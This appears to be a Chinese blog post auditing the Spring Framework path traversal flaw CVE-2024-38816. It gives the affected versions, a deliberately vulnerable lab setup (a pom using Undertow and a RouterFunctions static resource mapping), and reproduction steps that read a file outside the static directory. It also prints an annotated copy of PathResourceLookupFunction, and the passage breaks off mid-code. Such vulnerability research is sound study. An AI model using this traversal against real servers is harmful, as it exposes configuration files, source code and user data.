    <content type="html"><![CDATA[<h1 id="spring-framework目录遍历漏洞（cve-2024-38816）代码审计"><a href="#spring-framework目录遍历漏洞（cve-2024-38816）代码审计" class="headerlink" title="spring-framework目录遍历漏洞（cve-2024-38816）代码审计"></a>spring-framework目录遍历漏洞（cve-2024-38816）代码审计</h1><p>refer：</p><p><a href="https://securityonline.info/cve-2024-38816-spring-framework-path-traversal-vulnerability-threatens-millions/">https://securityonline.info/cve-2024-38816-spring-framework-path-traversal-vulnerability-threatens-millions/</a></p><p>影响版本：</p><p>spring-framework &lt; 5.3.40</p><p>spring-framework &lt; 6.0.24</p><p>spring-framework &lt; 6.1.13</p><blockquote><p>Any application using the <a href="https://spring.io/security/cve-2024-38816">affected</a> versions of Spring Framework (5.3.0 to 5.3.39, 6.0.0 to 6.0.23, and 6.1.0 to 6.1.12) and serving static resources through the vulnerable components is at risk.</p></blockquote><p>该漏洞在于 Spring Framework 如何处理通过功能性 Web 框架 WebMvc.fn 或 WebFlux.fn 提供的静态资源。通过构建恶意 HTTP 请求，攻击者可以绕过安全措施并从服务器的文件系统中检索任意文件，包括配置文件、源代码和用户数据。</p><blockquote><p>The vulnerability lies in how Spring Framework handles static resources served through the functional web frameworks WebMvc.fn or WebFlux.fn. By crafting malicious HTTP requests, attackers can bypass security measures and retrieve arbitrary files from the server’s file system, including configuration files, source code, and user data.</p></blockquote><p>修改比对 6.1.13 &amp; 6.1.12</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>环境搭建：</strong></p><p>JDK 21 &gt; 17（spring boot 3.x只支持 &gt; JDK17）</p><p>spring boot 3.3.3</p><p>spring-framework-bom 6.1.12</p><p>测试WebMvc.fn：spring-boot-starter-web， spring-boot-starter-undertow</p><p>测试WebFlux.fn：spring-boot-starterwebflux，spring-boot-starter-undertow</p><p>spring-boot-starter-web和spring-boot-starter-webflux最 好不要出现在⼀个项目，webmvc会干扰webflux。 不用再指定版本，springboot做过版本管理。tomcat和 jetty不支持这个漏洞，所以使用嵌入的undertow服务器，使用springboot内置的tomcat会报错400.</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924091139925.png" alt="image-20240924091139925"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">           http://maven.apache.org/POM/4.0.0</span></span></span><br><span class="line"><span class="string"><span class="tag">           http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>your-project-name<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 设置 Spring Boot 父项目 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 定义项目的属性 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>17<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span> <span class="comment">&lt;!-- 或根据需求选择 Java 版本 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 通常不需要单独指定 Spring Framework 版本，因为 Spring Boot 管理了 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;spring-framework.version&gt;6.1.12&lt;/spring-framework.version&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 管理依赖版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 通常不需要手动引入 Spring Framework BOM --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- Spring Boot 父项目已经管理了 Spring Framework 的版本 --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 如果确实需要，确保版本兼容 --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">                &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">                &lt;artifactId&gt;spring-framework-bom&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">                &lt;version&gt;$&#123;spring-framework.version&#125;&lt;/version&gt;</span></span><br><span class="line"><span class="comment">                &lt;type&gt;pom&lt;/type&gt;</span></span><br><span class="line"><span class="comment">                &lt;scope&gt;import&lt;/scope&gt;</span></span><br><span class="line"><span class="comment">            &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">            --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 引入 Spring Boot BOM 以确保兼容性 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 项目依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Spring Boot Starter Web，排除默认的 Tomcat --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Spring Boot Starter Undertow 代替默认的 Tomcat --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-undertow<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 其他必要的依赖，例如测试 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 插件配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- Spring Boot Maven 插件 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建WebMvc.fn或WebFlux.fn静态资源映射配置类。代码没区别，导包不⼀样，导⼊webmvc或webflux包下的 RouterFunction，ServerResponse，RouterFunctions。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.FileSystemResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.function.RouterFunction;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.function.RouterFunctions;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.function.ServerResponse;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RouterFunction&lt;ServerResponse&gt; <span class="title function_">route</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RouterFunctions</span><br><span class="line">                .resources(<span class="string">&quot;/static/**&quot;</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">FileSystemResource</span>(<span class="string">&quot;G:/test/test1/test2/static/&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>复现过程：</strong></p><p>目录结构如下：</p><p>1.txt：555555</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924091522898.png" alt="image-20240924091522898"></p><p>1.txt：666666</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924091609168.png" alt="image-20240924091609168"></p><p>正常读取G:&#x2F;test&#x2F;test1&#x2F;test2&#x2F;static&#x2F;静态目录下1.txt文件</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924091727296.png" alt="image-20240924091727296"></p><p>目录穿越读取G:&#x2F;test&#x2F;1.txt文件内容</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924091755049.png" alt="image-20240924091755049"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>比较spring-framework v6.1.13 和 v6.1.12 diff，发现一条对齐 RouterFunctions 资源处理的 Commit</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924094356795.png" alt="image-20240924094356795"></p><p>这条commit修改了</p><p>spring-webflux&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springframework&#x2F;web&#x2F;reactive&#x2F;function&#x2F;server&#x2F;PathResourceLookupFunction.java</p><p>spring-webmvc&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springframework&#x2F;web&#x2F;servlet&#x2F;function&#x2F;PathResourceLookupFunction.java</p><p>分别对应WebFlux.fn和WebMvc.fn</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924094656924.png" alt="image-20240924094656924"></p><p>IDEA maven下载spring-framework源码，以WebMvc为例进行分析，全局搜索定位到PathResourceLookupFunction类</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240924095833820.png" alt="image-20240924095833820"></p><p>让AI给这段代码加上注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.core.io.ClassPathResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.Resource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ResourceUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.Assert;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.PathPattern;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.PathPatternParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerRequest;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.UncheckedIOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 一个函数接口实现，用于根据请求路径匹配和查找相应的资源。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PathResourceLookupFunction</span> <span class="keyword">implements</span> <span class="title class_">Function</span>&lt;ServerRequest, Optional&lt;Resource&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用于匹配请求路径的模式。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PathPattern pattern;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 资源的基础位置。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Resource location;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造函数，初始化路径模式和资源位置。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pattern  路径模式字符串，用于匹配请求路径。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> location 资源的基础位置，不能为 null。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PathResourceLookupFunction</span><span class="params">(String pattern, Resource location)</span> &#123;</span><br><span class="line">        <span class="comment">// 确保路径模式字符串不为空</span></span><br><span class="line">        Assert.hasLength(pattern, <span class="string">&quot;&#x27;pattern&#x27; must not be empty&quot;</span>);</span><br><span class="line">        <span class="comment">// 确保资源位置不为 null</span></span><br><span class="line">        Assert.notNull(location, <span class="string">&quot;&#x27;location&#x27; must not be null&quot;</span>);</span><br><span class="line">        <span class="comment">// 解析路径模式字符串为 PathPattern 对象</span></span><br><span class="line">        <span class="built_in">this</span>.pattern = PathPatternParser.defaultInstance.parse(pattern);</span><br><span class="line">        <span class="built_in">this</span>.location = location;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据服务器请求查找匹配的资源。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request 服务器请求对象。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 一个包含匹配资源的 Optional 对象，如果没有匹配则返回 Optional.empty()。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Optional&lt;Resource&gt; <span class="title function_">apply</span><span class="params">(ServerRequest request)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取请求路径的 PathContainer</span></span><br><span class="line">        <span class="type">PathContainer</span> <span class="variable">pathContainer</span> <span class="operator">=</span> request.requestPath().pathWithinApplication();</span><br><span class="line">        <span class="comment">// 如果路径不匹配模式，返回空</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.pattern.matches(pathContainer)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Optional.empty();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 提取匹配的路径部分</span></span><br><span class="line">        pathContainer = <span class="built_in">this</span>.pattern.extractPathWithinPattern(pathContainer);</span><br><span class="line">        <span class="comment">// 处理路径，去除不必要的字符</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> processPath(pathContainer.value());</span><br><span class="line">        <span class="comment">// 如果路径包含百分号，进行 URI 解码</span></span><br><span class="line">        <span class="keyword">if</span> (path.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">            path = StringUtils.uriDecode(path, StandardCharsets.UTF_8);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果路径为空或无效，返回空</span></span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.hasLength(path) || isInvalidPath(path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Optional.empty();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 在基础位置创建相对路径的资源</span></span><br><span class="line">            <span class="type">Resource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="built_in">this</span>.location.createRelative(path);</span><br><span class="line">            <span class="comment">// 如果资源可读且位于基础位置下，返回该资源</span></span><br><span class="line">            <span class="keyword">if</span> (resource.isReadable() &amp;&amp; isResourceUnderLocation(resource)) &#123;</span><br><span class="line">                <span class="keyword">return</span> Optional.of(resource);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> Optional.empty();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            <span class="comment">// 将检查型异常转换为非检查型异常并抛出</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UncheckedIOException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理路径，去除前导和不必要的斜杠，并确保路径有效。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> path 输入的路径字符串。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 处理后的路径字符串。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">processPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">slash</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; path.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (path.charAt(i) == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                slash = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (path.charAt(i) &gt; <span class="string">&#x27; &#x27;</span> &amp;&amp; path.charAt(i) != <span class="number">127</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span> || (i == <span class="number">1</span> &amp;&amp; slash)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> path;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 去除前导无效字符</span></span><br><span class="line">                path = slash ? <span 